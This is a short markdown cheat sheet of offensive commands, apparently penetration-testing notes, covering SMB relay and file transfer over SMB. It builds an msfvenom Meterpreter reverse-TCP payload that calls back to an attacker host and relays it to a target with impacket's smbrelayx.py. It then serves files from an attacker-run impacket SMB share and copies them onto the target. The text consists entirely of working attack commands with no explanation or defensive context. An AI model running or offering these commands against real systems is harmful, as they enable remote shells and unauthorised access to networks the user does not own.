# SMB Relay
```bash
# First, create a payload with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LPORT=<Port #> -f exe -o smbexp.exe

# Second, launch exploit/multi/handler in Metasploit

./smbrelayx.py -h <Target Host> -e smbexp.exe
```

# SMB Server
```bash
# From Attack Host
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

# From Target
copy \\[Attack Host]\kali\[Filename] C:\[Directory]\[Filename]
```